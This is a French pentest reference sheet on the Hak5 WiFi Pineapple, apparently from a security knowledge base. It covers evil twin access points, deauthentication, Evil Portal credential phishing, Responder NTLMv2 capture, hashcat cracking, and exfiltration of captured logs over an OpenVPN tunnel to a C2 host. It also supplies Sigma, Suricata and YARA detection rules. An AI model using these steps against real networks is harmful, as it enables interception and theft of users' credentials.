---
title: "Outil - WiFi Pineapple"
type: outil
categorie: USB / HID & Gadgets
tags:
  - cyber
  - outil
  - hardware
  - USB / HID & Gadgets
statut: publie
version: Mark VII (2020) / Mark X ; firmware Entanglement 2.x (2.1.3 confirmé 2024)
licence: propriétaire (firmware Hak5) ; modules communautaires sous licences diverses (MIT, GPL…)
langage: OpenWrt (Linux) ; modules en shell/Python ; interface web (Pineapple Bar)
developpeur: Hak5 (Darren Kitchen)
repo: https://github.com/hak5
site: https://shop.hak5.org/products/wifi-pineapple
doc: https://docs.hak5.org/wifi-pineapple/
---

# WiFi Pineapple — Rogue AP, PineAP et Evil Portal

> [!info] **En 1 phrase**
> Une plateforme sans-fil (OpenWrt) conçue pour créer des **points d'accès rogues** : elle force les clients WiFi à se connecter à elle (PineAP), capte leur trafic et sert des **portails captifs** de phishing.

---

## Overview

| Champ | Valeur |
|---|---|
| Nom complet | WiFi Pineapple (Mark VII 2020, Mark X) |
| Description | Boîtier deux radios WiFi sous OpenWrt dédié aux attaques **Rogue AP / Evil Twin** : beacons PineAP, déauthentification, MITM, portail captif, collecte de credentials |
| Catégorie | USB / HID & Gadgets |
| Sous-catégorie | WiFi / Rogue Access Point & Evil Twin |
| Fonction principale | Attirer les clients WiFi sur un faux point d'accès, intercepter leur trafic et capturer des identifiants |
| Type d'outil | Hardware + plateforme OpenWrt + modules (interface web) |
| Licence | Firmware propriétaire Hak5 ; modules communautaires variés |
| Open source / propriétaire | Propriétaire (firmware) ; modules et PineAP partiellement documentés publiquement |
| Langage(s) de programmation | OpenWrt (Linux), modules en shell / Python, interface web (Lua/JS) |
| Développeur / organisation | Hak5 (Darren Kitchen, fondateur) |
| Documentation officielle | https://docs.hak5.org/wifi-pineapple/ |
| Date de création | 2008 (Mark I), série actuelle Mark VII (2020) / Mark X |
| État du projet | actif (Entanglement 2.x maintenu, Mark X commercialisé) |
| Dernière version connue | Firmware Entanglement 2.1.3 (2024) — Mark VII |
| Systèmes compatibles | Tout appareil WiFi (clients) ; administration via navigateur/SSH depuis Windows, macOS, Linux |

> [!note] Pour vérifier / compléter
> La version exacte du firmware et la compatibilité radio du Mark X évoluent régulièrement ; se référer à https://docs.hak5.org/wifi-pineapple/ pour les numéros de version confirmés.

---

## Concept

Le WiFi Pineapple (Hak5, modèles Mark VII et Mark X) est un boîtier embarquant **deux cartes WiFi** et un système **OpenWrt** personnalisé. Sa fonction principale : se faire passer pour le **SSID légitime** d'une entreprise (ou un AP ouvert) et **déauthentifier les clients** pour les faire basculer sur le faux point d'accès. Une fois les clients connectés, l'attaquant dispose d'un **MITM complet** : reniflage, injection, portail captif, modules. Les briques clés :
- **PineAP Daemon** : diffuse des beacons vers les SSID qu'il « connaît », répond aux probes, déauthentifie les clients ciblés et pousse vers son AP ;
- **Mode Open AP** : un réseau ouvert irrésistible (ex. « FreeWifi-Test ») attire les appareils en recherche de réseau ;
- **Modules** (interface web) : Evil Portal (portail captif de phishing), Responder (capture NTLMv2), sslstrip, tshark/Wireshark, mdk4, etc.
- **Logging & recon** : suivi des clients, des probes et des SSID observés.

L'outil est la pièce maîtresse des attaques **Rogue AP / Evil Twin** en test d'intrusion physique. Né en 2008, il a inventé la catégorie des « pineapple attacks » : le boîtier se positionne entre les clients et le point d'accès légitime, exploite la **confiance implicite des appareils WiFi** (auto-connexion aux SSID connus, réponse aux probes) et collecte tout ce qui transite. Le Mark VII (2020) ajoute le **dual-band 2.4/5 GHz** et une interface « Pineapple Bar » modernisée ; le Mark X reprend le concept avec des radios actualisées.

```mermaid
flowchart LR
    A["Clients WiFi en recherche de reseaux"] --> B["WiFi Pineapple - AP rogue (PineAP)"]
    B --> C["Portail captif Evil Portal"]
    B --> D["MITM - Responder sslstrip"]
    C --> E["Identifiants captures"]
    D --> E
    E --> F["Hashcat / Pass-the-Hash"]
```

---

## Concepts fondamentaux

| Concept | Explication |
|---|---|
| **Rogue Access Point** | Un AP non autorisé qui imite un SSID légitime pour capturer les clients (Evil Twin) |
| **PineAP Daemon** | Le moteur du Pineapple : beacons SSID, réponse aux probes, déauth ciblée, filtres et logging |
| **Beacon Response** | Le Pineapple répond aux requêtes de probe des clients, même pour des SSID qu'il n'héberge pas (Karma) |
| **Déauthentification** | Envoi de trames deauth 802.11 : les clients sont expulsés du vrai AP et se reconnectent au faux |
| **MITM (Man-in-the-Middle)** | Positionnement entre client et Internet : tout le trafic passe par le Pineapple (visible, modifiable) |
| **Evil Portal** | Module de portail captif : page de login factice qui collecte les identifiants saisis |
| **Responder** | Empoisonne LLMNR/NBT-NS/mDNS pour capturer les hashes NTLMv2 (voir [[Outil - Responder]]) |
| **sslstrip / downgrade** | Rétrogradation HTTPS→HTTP du trafic MITM pour lire des identifiants en clair |
| **Client Filter** | Listes d'allow/deny par MAC pour ne piéger que les appareils cibles |
| **OpenWrt** | Système Linux embarqué, base du Pineapple : opkg, iptables, hostapd, SSH |

---

## Installation

Le WiFi Pineapple est **prêt à l'emploi** en usine ; l'installation consiste à l'alimenter, le mettre à jour et installer les modules.

### Déballage et premier boot

```bash
# 1. Alimenter le Pineapple (USB-C / batterie) et attendre le boot (~1 min)
# 2. Se connecter au SSID par défaut "Pineapple" (pas de clé en usine)
# 3. Ouvrir l'interface : http://172.16.42.1:1471 (web UI)
# 4. Se connecter en SSH : ssh root@172.16.42.1  (identifiants par défaut documentés Hak5)
# 5. Mettre à jour le firmware et installer les modules via l'UI (Pineapple Bar)
# 6. Configurer : SSID, canaux (2.4/5 GHz), PineAP (beacons, deauth, filter)
```

### Mise à jour du firmware

```bash
# Depuis l'interface web : Settings > Firmware Update (ou manuellement)
# Le firmware "Entanglement" est fourni par Hak5 ; vérifier les notes de version
# avant de flasher sur un engagement (compatibilité modules)
```

### Installation des modules

```bash
# Méthode recommandée : Modules > Manage Modules > Install
# Modules utiles au pentest : Evil Portal, Responder, sslstrip, tshark, mdk4, dnsspoof
# Méthode CLI (SSH, système OpenWrt) :
ssh root@172.16.42.1
opkg update
opkg install tshark responder mdk4
```

> [!warning] Prérequis & problèmes potentiels
> - **Ne jamais brancher le Pineapple sur un réseau d'entreprise en production** sans autorisation : le Rogue AP déclenche immédiatement les WIDS/WIPS.
> - La **batterie** tient peu en PineAP actif : prévoir une alimentation USB continue.
> - Les **identifiants SSH par défaut** et le SSID usine doivent être changés avant toute opération hors lab.
> - Le **boîtier chauffe** en mode actif ; un suivi prolongé nécessite une ventilation.

---

## Configuration

| Paramètre | Rôle | Valeur possible | Impact | Exemple |
|---|---|---|---|---|
| `PineAP Daemon` | Moteur Rogue AP | ON/OFF | Active beacons, probes, deauth | `Enabled` dans PineAP Settings |
| `Broadcast SSID` | Diffuse les SSID connus | ON/OFF | Rend le faux AP visible | `ON` |
| `Beacon Response` | Répond aux probes des clients | ON/OFF | Piège les appareils en recherche de réseau | `ON` |
| `Open AP` | Réseau ouvert attractif | ON/OFF | Point d'entrée principal des clients | `ON` (SSID "FreeWifi-Test") |
| `Deauth / Client Filter` | Déconnecte / cible des MAC | liste MAC | Force le basculement vers le faux AP | `Add to Deny List` |
| `SSID à cloner` | Nom du réseau légitime | chaîne | Doit être identique au vrai AP | `Corporate-FR` |
| `Logger` | Journalisation des événements | ON/OFF | Traçabilité clients, probes, SSID | `Enabled` |
| `OpenVPN client` | Sortie discrète du Pineapple | config .ovpn | Masque le trafic de management | `/etc/openvpn/client.conf` |

---

## Architecture interne

- **Matériel** : deux radios WiFi (2.4 + 5 GHz), SoC MIPS/ARM, flash, batterie, USB-C. Le **Mark VII** ajoute un second slot MicroSD et le **dual-band simultané**.
- **Système** : **OpenWrt** personnalisé (firmware « Entanglement ») : gestion des paquets via `opkg`, services systemd/init.d, `hostapd` pour l'AP, `iptables` pour le routage.
- **Réseau interne** : le Pineapple expose une IP de management (**172.16.42.1**) ; le trafic des clients passe par une interface bridge vers `wlan0` (radio client) et `wlan1` (radio AP), routé vers Internet ou vers la sortie OpenVPN.
- **PineAP Daemon** : processus central qui pilote beacons, réponses de probe, deauth et filtres ; son état est piloté par l'interface web et persisté dans `/etc/pineapple/pineap_settings`.
- **Pineapple Bar / Web UI** : interface web (port 1471) qui orchestre les modules, les logs et la configuration.
- **Modules** : greffons (shell/Python) installés dans `/sd/modules` ou `/root/modules`, lancés et arrêtés par l'interface.
- **Flux de données** : Client → AP rogue (wlan1) → bridge → wlan0 → Internet ; chaque paquet est visible et modifiable (responder, sslstrip, tshark) au niveau du bridge.

---

## Commandes

### Commandes principales

```bash
# Accès SSH à la plateforme
ssh root@172.16.42.1

# Gestion des paquets (OpenWrt)
opkg update
opkg install tshark

# Voir les interfaces réseau
ifconfig wlan0 wlan1
iw dev
```

| Commande | Objectif | Résultat attendu |
|---|---|---|
| `ssh root@172.16.42.1` | Accès administration SSH | Shell OpenWrt sur le Pineapple |
| `opkg update` | Mettre à jour la liste des paquets | Répertoire des paquets à jour |
| `opkg install <pkg>` | Installer un paquet/module | Paquet installé et commandes disponibles |
| `ifconfig wlan0 wlan1` | Inspecter les interfaces radio | IP, MAC, statistiques des cartes |
| `iw dev` | Lister les interfaces et canaux WiFi | Configuration radio en cours |
| `logread -f` | Suivre les logs système | Événements PineAP, erreurs modules |

### Commandes avancées

```bash
# Capture directe sur l'interface client
tshark -i wlan0 -Y 'http.request.method == "POST"' -T fields \
  -e http.host -e http.request.uri -e http.file_data

# Lancer un module en CLI (ex. mdk4 pour deauth)
mdk4 wlan0 d -b AA:BB:CC:DD:EE:FF -c 6

# Redémarrer le daemon PineAP après modification
/etc/init.d/pineapd restart

# Sauvegarder la configuration
cp /etc/pineapple/pineap_settings /sd/backup_pineap_settings
```

---

## Options et flags

| Option / commande | Description | Exemple | Niveau |
|---|---|---|---|
| `PineAP Daemon` | Active le moteur de Rogue AP | toggle dans PineAP Settings | Basic |
| `Broadcast SSID` | Diffuse les SSID connus en beacons | `ON` | Basic |
| `Beacon Response` | Répond aux probes de n'importe quel SSID | `ON` | Basic |
| `Open AP` | Crée un réseau ouvert piège | `ON` (SSID "FreeWifi-Test") | Basic |
| `Deauth Broadcast` | Déauthentifie tous les clients du canal | `ON` | Intermediate |
| `Client Filter` | Allow/Deny list par MAC | `Add AA:BB:CC:DD:EE:FF to Deny List` | Intermediate |
| `Logger` | Journalise clients/probes/SSID | `ON` | Intermediate |
| `Evil Portal (module)` | Portail captif de phishing | template + postback | Advanced |
| `Responder (module)` | Capture NTLMv2 (LLMNR/NBT-NS) | lancement via module | Advanced |
| `sslstrip` | Downgrade HTTPS→HTTP | via module | Advanced |
| `OpenVPN client` | Sortie C2 discrète | config `.ovpn` | Expert |

> [!tip] Options les plus utiles au quotidien
> `PineAP Daemon` + `Beacon Response` + `Open AP` pour attirer les clients, `Client Filter` pour ne cibler que les appareils voulus, et le module `Evil Portal` pour la collecte des credentials.

---

## Exemples pratiques

### Beginner

Créer un simple point d'accès ouvert : `PineAP Daemon = ON` et `Open AP = ON` (SSID « FreeWifi-Test ») dans **PineAP Settings**, activer le **Logger**, puis vérifier depuis un smartphone que le client apparaît dans les logs (MAC, signal) — preuve du piégeage du réseau ouvert.

### Intermediate

Cloner un SSID légitime (« Corporate-FR », canal 6) dans **PineAP Settings**, activer `Deauth Broadcast` et ajouter le MAC de la victime au **Deny List** : le client se déconnecte du vrai AP puis rejoint le faux réseau — vérifier la perte puis la reconnexion dans le **Logger**.

### Advanced

```bash
# Objectif : collecter des identifiants via un portail captif personnalisé
# 1. Module Evil Portal : créer une template "Login Microsoft 365" clonée
# 2. Définir le postback : http://10.10.20.15/portal-login
# 3. Activer le portail ; un client se connecte et saisit ses identifiants
# 4. Les credentials apparaissent dans les logs du module
# 5. Le client est redirigé vers un site légitime pour ne pas éveiller les soupçons
```

### Expert

```bash
# Objectif : engagement autonome avec sortie OpenVPN et exfiltration
# 1. Configurer /etc/openvpn/client.conf vers le serveur C2 (10.10.20.15)
# 2. Lancer le tunnel : openvpn --config /etc/openvpn/client.conf --daemon
# 3. Activer PineAP + Responder ; collecter hashes NTLMv2 sur le faux AP
# 4. Exfiltrer les logs capturés vers le C2, puis nettoyage (modules OFF, tunnel retiré)
```

---

## Workflow complet (scénario pas à pas)

1. **Préparation** — alimenter le Pineapple, se connecter à l'UI (`http://172.16.42.1:1471`), mettre à jour le firmware, installer les modules (Evil Portal, Responder), changer les identifiants par défaut.
2. **Cibler** — identifier le SSID légitime à cloner (ex. « Corporate-FR ») et son canal via le logger ou un scan (`airodump-ng`).
3. **Configurer PineAP** — SSID cloné, canal/bande alignés, `Beacon Response` ON, `Open AP` ON, `Client Filter` vers les MAC cibles, `Deauth` ciblé.
4. **Attirer** — activer PineAP : les clients sont déauthentifiés du vrai AP et rejoignent le faux réseau.
5. **Collecter** — lancer le portail Evil Portal (login factice) ou Responder (hashes NTLMv2) ; les credentials sont journalisés dans l'UI.
6. **Exploiter** — traiter les hashes (`hashcat -m 5600`), tester les identifiants, ou pivoter en Pass-the-Hash (voir [[Techniques/Pass-the-Hash]]).
7. **Nettoyage** — désactiver PineAP et les modules, déconnecter les clients, exporter les logs, éteindre.

---

## Scénarios avancés

### Scénario 1 : Evil Portal — portail captif de phishing WiFi

Un client se connecte au « Corporate-FR » ouvert, voit une page « Veuillez vous authentifier » et tape son identifiant de domaine.

```bash
# Dans le module Evil Portal :
#  1. Choisir une template (ou la créer) : "Login Microsoft 365 / Captive portal"
#  2. Saisir l'URL de postback : http://10.10.20.15/portal-login
#  3. Activer le portail : le client reçoit la page à la connexion
#  4. Les identifiants sont enregistrés dans les logs du module
```

Le portail doit imiter **fidèlement** l'écran de login (logo, domaine, messages) : le succès dépend du réalisme du clone.

### Scénario 2 : Responder sur le réseau MITM — capture NTLMv2

Pendant que les clients sont sur le faux AP, Responder empoisonne les résolutions LLMNR/NBT-NS pour voler des hashes.

```bash
# 1. Installer le module : opkg install responder
# 2. Lancer Responder sur l'interface du Pineapple (via module ou CLI)
# 3. Un client tente d'accéder à \\fileserver ou tape un UNC
# 4. Responder renvoie un hash NTLMv2 qui apparaît dans les logs
# 5. Crack hors-ligne : hashcat -m 5600 <hash> rockyou.txt
```

Complète l'attaque Rogue AP : les hashes capturés servent ensuite en **Pass-the-Hash** ou au crack des mots de passe.

### Scénario 3 : Reconnaissance des SSID et probes environnants

```bash
# UI > Logging : collecter les SSID diffusés et les probes envoyées par les clients
# Exploiter les probes (ex: "Corp-Wifi") pour cibler les appareils en déplacement
```

### Scénario 4 : Passthru et capture d'identifiants de portail légitime

```bash
# Module Evil Portal > Passthru : URL du vrai portail cible
# Le client voit le vrai portail, mais les credentials transitent par le Pineapple
# et sont journalisés avant d'être relayés au serveur légitime
```

---

## Cybersecurity use cases

| Phase | Utilisation |
|---|---|
| Reconnaissance | Scan des SSID, probes et clients via le logger ; cartographie WiFi cible |
| Accès réseau | Création d'un Rogue AP : obtenir un point de présence MITM sur le réseau |
| Credential Access | Portail captif (phishing), Responder (NTLMv2), sslstrip (downgrade HTTPS) |
| Collection | Sniffing de tout le trafic des clients connectés (tshark, logs) |
| Persistance | Sortie OpenVPN pour garder un canal C2 discret pendant l'engagement |
| Exploitation | Downgrade, injection de payloads, redirection DNS (dnsspoof) |

---

## MITRE ATT&CK

| Tactique | Technique / Sub-technique | ID | Raison | Détection | Mitigation |
|---|---|---|---|---|---|
| Initial Access | Hardware Additions | T1200 | Le Pineapple est un add-on matériel placé physiquement pour l'accès réseau | Inventaire des devices, contrôle des accès physiques | Sécurisation des baies/locaux, inventaire physique |
| Credential Access | Adversary-in-the-Middle | T1557 | Le Pineapple s'intercale entre clients et AP pour intercepter le trafic | WIDS/WIPS, détection de Rogue AP | WPA2-Enterprise + 802.1X, certificats |
| Credential Access | LLMNR/NBT-NS Poisoning | T1557.001 | Responder empoisonne les résolutions pour capturer NTLMv2 | Corrélation des réponses LLMNR/NBT-NS, alertes Responder | Désactivation LLMNR/NBT-NS via GPO |
| Credential Access | ARP Cache Poisoning | T1557.002 | Empoisonnement ARP possible depuis le faux AP | Analyse des réponses ARP incohérentes | Port security, segmentation réseau |
| Credential Access | Input Capture | T1056.001 | Le portail Evil Portal capture les frappes clavier des victimes | Analyse du trafic, pages de login non sollicitées | Sensibilisation phishing, validation certs |
| User Execution | Malicious File | T1204.002 | Les clients interagissent avec le portail captif piégé | Événements de navigation vers domaines inconnus | Filtrage web, sensibilisation |

> [!note] Ne renseigner que si l'association est réellement pertinente.

---

## Defensive Security

### Signes observables

| Indicateur | Détail |
|---|---|
| SSID « Pineapple » visible en scan | Nom par défaut Hak5 encore présent (inventaire ouïe des scans) |
| Double AP avec même SSID (BSSID différent) | Deux points d'accès portant le même SSID : signature d'Evil Twin |
| MAC du faux AP ≠ MAC du vrai AP | Incohérence BSSID à SSID identique |
| Réponses aux probes pour des SSID non hébergés | Comportement Karma/PineAP, détectable par WIDS |
| Déauthentications massives répétées | Rafales de trames deauth 802.11 sur un canal |
| Réseau ouvert inattendu à proximité | Un AP ouvert alors que la politique impose WPA2-Enterprise |
| Portail captif à la connexion | Page de login non sollicitée après association WiFi |

### Règles de détection (Sigma / Suricata / Snort / YARA)

```yaml
# Sigma — détection de Rogue AP : deux AP avec le même SSID mais BSSID différents
title: Potential Rogue Access Point (Duplicate SSID)
id: 8c4e7b1a-3f2e-4a1b-9c3d-2e8f5a6b7c01
status: experimental
logsource:
    product: wireless
detection:
    selection:
        ssid: Corporate-FR
    condition: selection
    # À corréler avec les BSSID distincts observés (Kismet, WIDS)
falsepositives:
    - Réseaux mesh légitimes (même SSID sur plusieurs AP)
level: medium
```

```bash
# Suricata — alerte sur deauth massif (soupe 802.11 analysée via un capteur)
alert ieee80211 any any -> any any (msg:"Massive 802.11 Deauth Flood"; \
  subfunc:deauth; threshold: type both, track by_src, count 20, seconds 5; \
  sid:20260001; rev:1;)
```

```yaml
# YARA — recherche de templates Evil Portal contenant un postback de collecte
rule EvilPortal_Postback {
    strings:
        $a = "postback" ascii nocase
        $b = "portal-login" ascii nocase
        $c = "username" ascii nocase
        $d = "password" ascii nocase
    condition:
        $a and $b and ($c or $d)
}
```

---

## Automatisation

```bash
# Bash — surveiller en boucle les clients connectés et sauvegarder les logs
while true; do echo "$(date) ---"; iw dev wlan1 station dump | grep Station; sleep 60; done
scp -r root@172.16.42.1:/sd/logs ./pineapple_logs_$(date +%F)
```

```python
# Python — parsing des logs clients du Pineapple (MAC, SSID, signal)
import re

for m in re.finditer(r"(?P<mac>[0-9A-Fa-f:]{17}).*SSID=(?P<ssid>[^\s]+).*rssi=(?P<rssi>-?\d+)",
                     open("pineapple_logs/clients.log").read()):
    print(f"{m.group('mac')} -> {m.group('ssid')} ({m.group('rssi')} dBm)")
```

---

## Output et parsing

Les sorties du Pineapple sont les **logs des modules** (interface web) et les **fichiers de logs** sur la SD (`/sd/logs`).

| Format | Contenu | Emplacement |
|---|---|---|
| Logs clients | MAC, SSID rejoint, signal | UI > Logging, `/sd/logs/` |
| Logs probes | SSID demandés par les clients | UI > Logging |
| Logs Evil Portal | Identifiants saisis au portail | Module Evil Portal |
| Logs Responder | Hashes NTLMv2 capturés | Module Responder |
| PCAP tshark | Trafic brut des clients | Fichier `.pcap` sur la SD |

```bash
# Export des logs via SSH
scp -r root@172.16.42.1:/sd/logs ./logs

# Conversion/lecture des captures
tshark -r capture.pcap -Y 'http' | head -50
```

```python
# Python — extraction des identifiants depuis les logs Evil Portal (format JSON)
import json

with open("evilportal_logs.json") as f:
    for entry in json.load(f):
        print(entry.get("timestamp"), entry.get("username"), entry.get("password"))
```

---

## Intégrations

- [[Tools| Outils]] global
- [[Outil - Responder]] — capture NTLMv2 sur le réseau MITM du Pineapple
- [[Outil - Wireshark]] / [[Outil - tshark]] — analyse des captures effectuées sur le boîtier
- [[Outil - hashcat]] — crack des hashes NTLMv2 récoltés (`-m 5600`)
- [[Outil - Evilginx2]] — portail de phishing avancé (complément du portail captif)
- [[Outil - bettercap]] — alternative logicielle pour Rogue AP/ARP spoofing
- [[Outil - aircrack-ng]] — scan/deauth complémentaire depuis un PC
- [[Outil - Wifite]] / [[Outil - Wifiphisher]] — alternatives CLI automatisées
- [[Outil - Metasploit]] / [[Outil - PowerShell Empire]] — payloads servis aux clients piégés
- [[Techniques/Attaques WiFi - Rogue AP]] — fiche technique Rogue AP / Evil Twin
- [[Techniques/LLMNR-NBT-NS Poisoning]] — fiche technique empoisonnement LLMNR/NBT-NS
- [[Techniques/Attaques WiFi (WPA2 et PMKID)]] — hub des attaques WiFi du vault
- [[Techniques/Pass-the-Hash]] — exploitation des hashes NTLMv2 capturés

```text
Clients WiFi → Pineapple (PineAP + Evil Portal) → logs → hashcat / Pass-the-Hash
                                     ↓
                            Responder → NTLMv2 → C2 (Metasploit, Empire)
```

---

## Alternatives

| Outil | Avantages | Inconvénients | Cas d'usage |
|---|---|---|---|
| [[Outil - Wifiphisher]] | Gratuit, Rogue AP/portail automatisé sur Kali | Nécessite une interface WiFi dédiée, mono-bande | Test interne rapide sans matériel |
| [[Outil - bettercap]] | MITM/ARP/HTTP flexible, CLI + API | Pas de beacons/Karma PineAP natifs | MITM généraliste sur le réseau |
| [[Outil - Evilginx2]] | Phishing avec reverse proxy 2FA | Pas de Rogue AP (trafic réseau normal) | Campagne phishing sophistiquée |
| [[Outil - aircrack-ng]] | Deauth/scan/recon 802.11 complet | Pas de portail captif intégré | Recon et test de robustesse |
| Flipper Zero (WiFi dev board) | Compagnon de poche, Marauder | Puissance/portée limitées | Tests opportunistes mobiles |

> **Quand utiliser le Pineapple plutôt que Wifiphisher ?** Pour le Rogue AP **dual-band** fiable, le moteur PineAP (beacons/probes/Karma) et le catalogue de modules mains-libres ; Wifiphisher reste l'option logicielle gratuite sur Kali.

---

## Performance

- **Radios** : dual-band 2.4/5 GHz simultanés (Mark VII) — capture des clients sur les deux bandes.
- **Portée** : dépend de l'antenne et de la puissance (configurable) ; en intérieur, quelques dizaines de mètres.
- **Concurrence** : gère plusieurs dizaines de clients simultanément (limite pratique du CPU/radio).
- **Batterie** : autonomie limitée (moins d'une heure en PineAP + modules actifs) ; alimentation USB requise pour les engagements longs.
- **Charge** : le CPU OpenWrt encaisse beacons + logging ; un `tshark -i wlan0` intensif dégrade la réactivité de l'UI. (Les chiffres exacts — puissance radio, autonomie — dépendent du modèle et du firmware.)

---

## Troubleshooting

### Common problems

#### Problème : je n'arrive pas à joindre l'interface `http://172.16.42.1:1471`

- **Cause** : mauvais SSID connecté, adresse IP manuelle, ou boot incomplet.
- **Solution** : vérifier la connexion au SSID « Pineapple », relancer, ou `ip addr` côté client pour obtenir la 172.16.42.x. **Vérification** : l'UI répond au `ping 172.16.42.1`.

#### Problème : le client se connecte au vrai AP et pas au faux

- **Cause** : SSID/canal/bande non alignés avec le vrai AP, ou deauth inactif.
- **Solution** : cloner exactement le SSID, choisir le même canal/bande, activer `Deauth Broadcast` ou le `Client Filter` ciblé. **Vérification** : le client apparaît dans le logger du Pineapple.

#### Problème : le portail captif ne s'affiche pas à la connexion

- **Cause** : template mal configurée ou postback invalide.
- **Solution** : tester la template sur un appareil témoin, vérifier l'URL de postback, activer le module avant de piéger le client. **Vérification** : la page de login apparaît et les saisies sont loggées.

#### Problème : Responder ne capture aucun hash

- **Cause** : LLMNR/NBT-NS désactivés sur le réseau cible, ou client qui ne tente aucune résolution UNC.
- **Solution** : déclencher une résolution (ex. `ping \\fileserver`), vérifier que Responder écoute bien sur l'interface bridge. **Vérification** : des hashes NTLMv2 apparaissent dans les logs.

#### Problème : le Pineapple surchauffe ou se fige en pleine attaque

- **Cause** : charge CPU élevée (PineAP + logging + tshark) et mauvaise dissipation.
- **Solution** : limiter le logging, arrêter les modules non utilisés, ventiler le boîtier, alimenter en continu. **Vérification** : `uptime` et `top` sur le Pineapple montrent une charge raisonnable.

---

## Sécurité de l'outil

- **Légalité** : créer un Rogue AP et intercepter le trafic sans autorisation est illégal (espionnage des communications). Uniquement en test autorisé (mandat, lab).
- **Identifiants par défaut** : changer immédiatement le mot de passe root et le SSID « Pineapple » hors lab ; sinon l'attaquant lui-même est compromettable.
- **Exposition de management** : l'interface 1471 ne doit pas être accessible depuis le réseau cible ; la sortir en OpenVPN dédié.
- **Données collectées** : les credentials et captures sont sensibles — chiffrer la SD, purger les logs après chaque engagement.
- **Traçabilité** : le Pineapple laisse des traces (beacons, deauth, BSSID) identifiables par WIDS ; prévoir une fenêtre et une zone d'action contrôlées.

---

## Limitations

- **Pas d'exploitation système en soi** : il capture et relaie ; l'exploitation repose sur les modules et les outils externes.
- **Détectable par WIDS/WIPS** : beacons, deauth massifs et double SSID sont des signatures classiques.
- **Nécessite un AP légitime à cloner** : sans SSID cible réaliste, l'attirance des clients est faible (sauf Open AP « FreeWifi-Test »).
- **Configuration manuelle** : le réglage fin (canaux, filtres, templates) demande du temps et des tests.
- **Autonomie électrique limitée** : PineAP + modules épuisent la batterie rapidement.
- **Pas de protection intégrée de l'opérateur** : sans OpenVPN, le trafic de management du Pineapple est visible.

---

## Cheatsheet

```bash
# Accès
ssh root@172.16.42.1

# Configuration minimale d'un Rogue AP (via UI > PineAP Settings)
#  PineAP Daemon : ON   |   Beacon Response : ON
#  Open AP : ON (SSID "FreeWifi-Test")   |   Deauth : ciblé
#  Client Filter : Deny List = MAC à piéger

# Module Evil Portal
#  Template : "Login Microsoft 365" | Postback : http://10.10.20.15/portal-login

# Capture de trafic
tshark -i wlan0 -Y 'http.request.method == "POST"' -T fields \
  -e http.host -e http.request.uri -e http.file_data

# Hashes NTLMv2 puis crack
hashcat -m 5600 captured_ntlmv2.txt rockyou.txt

# Sortie discrète
openvpn --config /etc/openvpn/client.conf --daemon
```

---

## Quick reference

| | |
|---|---|
| **À quoi sert-il ?** | Créer un Rogue AP / Evil Twin pour attirer les clients WiFi, les MITM et capturer leurs identifiants |
| **Quand l'utiliser ?** | Test d'intrusion physique autorisé : Rogue AP, portail captif, capture NTLMv2, sniffing |
| **Commande principale** | UI `http://172.16.42.1:1471` : PineAP ON + Open AP + module Evil Portal/Responder |
| **Alternative principale** | [[Outil - Wifiphisher]] (logiciel) · [[Outil - bettercap]] (MITM) · [[Outil - Evilginx2]] (phishing) |
| **Concepts importants** | Rogue AP, PineAP, Beacon Response, deauth, Evil Portal, MITM, NTLMv2 |
| **Liens associés** | [[Outil - Responder]] · [[Outil - Wireshark]] · [[Techniques/Attaques WiFi - Rogue AP]] · [[Techniques/LLMNR-NBT-NS Poisoning]] |

---

## Détection & Défense

| Signe | Défense |
|---|---|
| SSID « Pineapple » visible en scan ouverture | Scan WiFi régulier (Kismet, Aircheck), chasse aux AP suspects |
| MAC du faux AP ≠ MAC du vrai AP (même SSID) | Rogue AP Detection : vérifier la cohérence BSSID/EAP, WIDS/WIPS |
| Clients connectés à un réseau ouvert inattendu | Politique : WiFi entreprise en WPA2-Enterprise + 802.1X (pas de réseau ouvert) |
| Portail captif inattendu à la connexion | Sensibilisation : vérifier le certificat et le domaine avant de saisir ses identifiants |
| Déauthentications massives répétées | Détection de deauth (Wireshark, IDS sans-fil) + corrélation des alertes |
| Réponse aux probes WiFi d'AP inconnus | Surveillance des probe responses, WIDS avec détection des AP « imposteurs » |
| Trafic HTTP anormal en sortie (downgrade) | HSTS pré-chargé, politiques TLS strictes, supervision du trafic |

---

## Tips & Pièges

> [!tip] **Tips**
> - Utiliser **deux canaux** (2.4 + 5 GHz) pour couvrir les deux bandes et maximiser le taux de capture des clients.
> - La fonction **« Responder + PineAP »** fonctionne mieux la nuit (bureaux vides, portables qui se reconnectent seuls).
> - Cloner le SSID du vrai AP **avec le bon canal et la même bande** : les clients basculent plus facilement.
> - Configurer le **Client Filter** (liste MAC) pour ne piéger que les appareils cibles.
> - Tester toujours la template du portail captif sur un appareil témoin avant le déploiement réel.

> [!warning] **Pièges**
> - PineAP ouvert = **n'importe qui** peut se connecter au faux AP : sans filtrage, l'attaque devient visible et des clients tiers peuvent la compromettre.
> - Un portail captif mal configuré peut **bloquer la connexion** sans capturer quoi que ce soit : tester la template avant le déploiement.
> - Le Rogue AP est **facilement détecté** par un WIDS (BSSID inconnu, deauth en rafale) : en test autorisé, prévenir le client et définir des horaires.
> - Le boîtier chauffe et tient peu sur batterie en PineAP actif : prévoir une alimentation continue.
> - Ne pas oublier de **changer les identifiants par défaut** et le SSID « Pineapple » hors lab.

---

## References

### Official

- Documentation officielle Hak5 — WiFi Pineapple : https://docs.hak5.org/wifi-pineapple/
- Fiche produit Hak5 (Mark VII / Mark X) : https://shop.hak5.org/products/wifi-pineapple
- GitHub Hak5 (modules, outils annexes) : https://github.com/hak5

### Security references

- MITRE ATT&CK T1557 — Adversary-in-the-Middle : https://attack.mitre.org/techniques/T1557/
- MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning : https://attack.mitre.org/techniques/T1557/001/
- MITRE ATT&CK T1056.001 — Input Capture (Keylogging) : https://attack.mitre.org/techniques/T1056/001/
- MITRE ATT&CK T1204 — User Execution : https://attack.mitre.org/techniques/T1204/
- NIST SP 800-153 (sécurité WiFi) : https://csrc.nist.gov/pubs/sp/800/153/final

### Community

- HackTricks — Rogue AP / Evil Twin : https://book.hacktricks.xyz/
- Write-ups et tutos Hak5 WiFi Pineapple (forums) : https://forums.hak5.org/forum/48-wifi-pineapple/
- Recherches Rogue AP detection et WIDS (blogs sécurité spécialisés)

---

**Liens :** [[Tools| Outils]] · [[Techniques/Attaques WiFi - Rogue AP| Rogue AP & MITM]] · [[Techniques/LLMNR-NBT-NS Poisoning| LLMNR/NBT-NS Poisoning]] · [[Techniques/Attaques WiFi (WPA2 et PMKID)| Hub WiFi]]
